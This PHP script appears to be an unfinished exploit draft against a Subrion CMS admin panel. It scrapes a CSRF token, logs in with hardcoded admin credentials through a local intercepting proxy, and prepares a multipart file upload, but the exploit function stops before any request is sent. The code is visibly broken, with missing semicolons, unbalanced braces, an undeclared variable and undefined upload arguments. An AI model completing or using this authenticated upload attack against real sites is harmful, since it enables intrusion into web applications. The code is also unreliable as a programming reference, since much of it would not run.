<?php

require_once("serializer.php");
define('PROXY', '127.0.0.1:8080')
define('TARGET', 'http://subrion.local');
define('COOKIEJAR', './cookies.txt');

function build_data_files($boundary, $fields, $files){
    $data = '';
    $eol = "\r\n";

    $delimiter = '-------------' . $boundary;

    foreach ($fields as $name => $content) {
        $data .= "--" . $delimiter . $eol
            . 'Content-Disposition: form-data; name="' . $name . "\"".$eol.$eol
            . $content . $eol;
    }
        $data .= $eol;
        $data .= $content . $eol;
    }
    $data .= "--" . $delimiter . "--".$eol;

    return $data;
}

function get($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,$url);
	curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 0);
	curl_setopt($ch, CURLOPT_PROXY, PROXY);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
	curl_setopt($ch, CURLOPT_COOKIEJAR, COOKIEJAR);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'GET');
	curl_setopt ($ch, CURLOPT_HEADER, 1);
	curl_exec ($ch); 
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}


function post($url, $data){
	$curl = curl_init();

	$boundary = uniqid();
	$delimiter = '-------------' . $boundary;

	$post_data = build_data_files($boundary, $fields, $files);

	curl_setopt_array($curl, array(
	  CURLOPT_URL => $url,
	  CURLOPT_COOKIEJAR => COOKIEJAR,
	  CURLOPT_RETURNTRANSFER => 1,
	  CURLOPT_MAXREDIRS => 10,
	  CURLOPT_TIMEOUT => 30,
	  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
	  CURLOPT_CUSTOMREQUEST => "POST",
	  CURLOPT_POST => 1,
	  CURLOPT_POSTFIELDS => $post_data,
	  CURLOPT_HTTPHEADER => array(
		//"Authorization: Bearer $TOKEN",
		"Content-Type: multipart/form-data; boundary=" . $delimiter,
		"Content-Length: " . strlen($post_data)
	  ),
	));

	$result = curl_exec($curl);
	$status = curl_getinfo($curl)['http_code'];
	$err = curl_error($curl);
	curl_close($curl);
	return array("code" => $status, "data" => $result, "error" => $err);
}

function get_csrf_token($url){
	response = get($url);
	$csrf_token = preg_match_all('__st\".*\svalue\=\"(\w*)\"' , $response);
	return $csrf_token[1];
}

function login(){
	$url = TARGET . '/panel/';
	$csrf_token = get_csrf_token($url);
	$data = "__st=$csrf_token&username=admin&password=Passw0rd!"
	post($url, $data);
}

function exploit(){
	$fields = array("_st"=>"", "another_field2"=>"anothervalue");

// files to upload
$filenames = array("/tmp/1.jpg", "/tmp/2.png");

$files = array();
foreach ($filenames as $f){
   $files[$f] = file_get_contents($f);
}
// curl
	
}
?>